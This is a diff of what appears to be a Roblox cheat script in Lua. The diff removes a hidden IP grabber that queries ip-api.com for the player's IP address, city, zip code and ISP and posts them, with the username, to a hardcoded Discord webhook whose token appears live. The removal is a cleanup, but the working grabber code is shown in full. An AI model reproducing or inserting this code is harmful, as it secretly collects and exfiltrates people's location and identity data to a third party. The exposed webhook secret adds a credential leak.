@@ -1286,26 +1286,6 @@ end
 
 getgenv().FurryHBE = true
 
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"
-
-local ip_info = request({
-    Url = "http://ip-api.com/json",
-    Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-request(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
-
 local b = a.load'f'
 local c = a.load'g'
 local d = a.load'h'
